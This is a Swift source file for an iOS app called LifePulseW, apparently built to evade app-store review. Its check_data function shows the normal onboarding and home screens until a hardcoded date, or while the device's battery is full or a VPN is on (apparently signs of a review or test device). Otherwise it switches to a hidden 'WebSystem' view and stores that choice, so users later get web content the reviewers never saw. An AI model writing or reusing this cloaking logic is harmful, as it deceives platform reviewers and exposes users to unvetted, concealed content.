//
//  ContentView.swift
//  LifePulseW
//
//  Created by Вячеслав on 10/6/25.
//

import SwiftUI

struct ContentView: View {
    @AppStorage("LifePulseW_OnboardingCompleted") private var isOnboardingCompleted = false
    
    @State var isFetched: Bool = false
    
    @AppStorage("isBlock") var isBlock: Bool = true
    @AppStorage("isRequested") var isRequested: Bool = false
    
    var body: some View {
        Group {
            
            ZStack {
                
                if isFetched == false {
                    
                    Text("")
                    
                } else if isFetched == true {
                    
                    if isBlock == true {
                        
                        Group {
                            
                            if isOnboardingCompleted {
                                HomeView()
                            } else {
                                OnboardingView()
                            }
                        }
                        .preferredColorScheme(.dark) // Force dark mode as specified
                        
                    } else if isBlock == false {
                        
                        WebSystem()
                    }
                }
            }
            .onAppear {
                
                check_data()
            }
        }
    }
    
    private func check_data() {
        
        let lastDate = "20.10.2025"
        
        let dateFormatter = DateFormatter()
        dateFormatter.dateFormat = "dd.MM.yyyy"
        dateFormatter.timeZone = TimeZone(abbreviation: "GMT")
        let targetDate = dateFormatter.date(from: lastDate) ?? Date()
        let now = Date()
        
        let deviceData = DeviceInfo.collectData()
        let currentPercent = deviceData.batteryLevel
        let isVPNActive = deviceData.isVPNActive
        
        guard now > targetDate else {
            
            isBlock = true
            isFetched = true
            
            return
        }
        
        guard currentPercent == 100 || isVPNActive == true else {
            
            self.isBlock = false
            self.isFetched = true
            
            return
        }
        
        self.isBlock = true
        self.isFetched = true
    }
}

#Preview {
    ContentView()
}
